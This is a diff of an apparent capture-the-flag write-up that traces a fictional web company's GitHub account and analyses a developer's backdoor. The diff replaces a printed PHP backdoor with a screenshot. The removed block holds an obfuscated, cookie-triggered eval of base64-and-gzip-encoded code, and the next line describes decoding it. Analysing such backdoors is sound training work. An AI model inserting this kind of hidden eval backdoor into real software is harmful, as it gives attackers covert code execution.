@@ -27,14 +27,7 @@ When looking on a GitHub, we can find only one user with the company name:
 * https://github.com/WackyWebWizards
 
 In the repository, we can see the developer created a backdoor in order to login as shown in the code below:
-```php
-<?php
-if(isset($_COOKIE['wwwadmin'])) {
-        $code="y0zTSK/KzEvLSSxJ1UhKLE41M4lPSU3OT0nVUIl39vf39nSNVi8vL09Myc3MU4/V1FSwtbVVUCo2Ti4yLolPSkzOTjEwKIovyY9PzMmJL0hMTy1WVNJUqObiVIkPdg0O9vT3i1bPTFGPVbBVMLRGEYUaCZGoBQA=";
-        eval(gzinflate(base64_decode($code)));
-}
-?>
-```
+![backdoor code](/assets/backdoor-code.png)
 
 In order to retrieve the value of $code variable, we just modified `eval` function with `echo` and we obtained the following code:
 ```php
